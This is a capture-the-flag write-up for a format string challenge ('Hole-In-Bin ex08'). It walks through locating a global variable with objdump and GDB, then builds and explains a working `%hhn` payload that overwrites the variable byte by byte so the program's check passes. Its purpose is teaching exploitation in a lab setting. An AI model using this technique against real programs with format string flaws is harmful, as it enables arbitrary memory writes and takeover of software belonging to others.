# Hole-In-Bin - ex08 (Format String Write)

## Goal

Modify the global variable `target` so that it becomes:

```
0x01025544
```

When the value is correct, the program prints:

```
you have modified the target :)
```

---

# 1. Check the challenge description

```bash
cat README.txt
```

Output:

```
This level is completed when you see the “you have modified the target” message.
```

---

# 2. Find the target variable

Use `objdump` to locate the global variable.

```bash
objdump -t bin | grep target
```

Output:

```
080496f4 g     O .bss 00000004 target
```

So:

```
target = 0x080496f4
```

Since it is a 4-byte integer, each byte is stored separately in memory (little-endian).

The four addresses are therefore:

```
0x080496f4
0x080496f5
0x080496f6
0x080496f7
```

These are the addresses we will overwrite.

---

# 3. Analyze the binary

Open the program in GDB.

```bash
gdb -q ./bin
```

Set a breakpoint.

```gdb
break vuln
run
```

Disassemble the vulnerable function.

```gdb
disassemble vuln
```

The interesting part is:

```asm
call printbuffer

mov 0x80496f4,%eax
cmp $0x1025544,%eax
jne fail
```

This tells us that after `printbuffer()` returns, the program compares the value stored at `target` with:

```
0x01025544
```

If they are equal:

```
you have modified the target :)
```

Otherwise it prints:

```
target is %08x :(
```

---

# 4. Understanding the vulnerability

Inside `printbuffer()` the user input is passed directly to `printf()`.

Conceptually it looks like:

```c
printf(buffer);
```

instead of the safe version:

```c
printf("%s", buffer);
```

Because our input becomes the format string itself, we can use format specifiers such as:

```
%x
%n
%hhn
```

to read and write arbitrary memory.

This is a classic **Format String Vulnerability**.

---

# 5. Why use `%hhn`?

The value to write is:

```
0x01025544
```

In memory (little-endian), the bytes are:

```
44
55
02
01
```

We therefore write one byte at a time.

`%hhn` writes **one byte** (8 bits).

Writing byte-by-byte is much easier than trying to write the entire 32-bit integer with a single `%n`.

---

# 6. Build the payload

First place the four destination addresses at the beginning of the input.

```text
0x080496f4
0x080496f5
0x080496f6
0x080496f7
```

Encoded as raw bytes:

```python
"\xf4\x96\x04\x08"
"\xf5\x96\x04\x08"
"\xf6\x96\x04\x08"
"\xf7\x96\x04\x08"
```

Then use carefully chosen paddings so that the total number of printed characters matches the byte we want to write.

Payload:

```python
python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$hhn%17x%13$hhn%173x%14$hhn%255x%15$hhn"' | ./bin
```

---

# 7. What each part does

Addresses:

```
\xf4\x96\x04\x08
```

Destination for byte:

```
0x44
```

```
%52x
```

Prints enough characters so the total count becomes:

```
68 (0x44)
```

```
%12$hhn
```

Writes:

```
0x44
```

to

```
0x080496f4
```

---

Next:

```
%17x
```

Increases the printed count from

```
68
```

to

```
85 (0x55)
```

Then:

```
%13$hhn
```

writes

```
0x55
```

to

```
0x080496f5
```

---

Next:

```
%173x
```

Moves the printed count to

```
258
```

Only the lowest byte is written by `%hhn`:

```
258 mod 256 = 2
```

So:

```
%14$hhn
```

writes:

```
0x02
```

to

```
0x080496f6
```

---

Finally:

```
%255x
```

The printed count becomes:

```
513
```

Again, `%hhn` only keeps the lowest byte:

```
513 mod 256 = 1
```

Therefore:

```
%15$hhn
```

writes:

```
0x01
```

to

```
0x080496f7
```

---

# 8. Final memory layout

After all four writes:

| Address    | Value |
| ---------- | ----- |
| 0x080496f4 | 0x44  |
| 0x080496f5 | 0x55  |
| 0x080496f6 | 0x02  |
| 0x080496f7 | 0x01  |

The 32-bit integer stored in memory is therefore:

```
0x01025544
```

which matches the value expected by the program.

---

# 9. Result

Running the exploit:

```bash
python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$hhn%17x%13$hhn%173x%14$hhn%255x%15$hhn"' | ./bin
```

Output:

```
you have modified the target :)
```

---

# Summary

* The program passes user input directly to `printf()`, creating a format string vulnerability.
* `%n`-family specifiers allow writing to arbitrary memory.
* `%hhn` writes one byte at a time.
* Four consecutive addresses of `target` are placed at the start of the payload.
* Carefully chosen padding values control the number of printed characters before each `%hhn`, resulting in the bytes `44 55 02 01`.
* These bytes form the integer `0x01025544`, satisfying the program's check and completing the challenge.
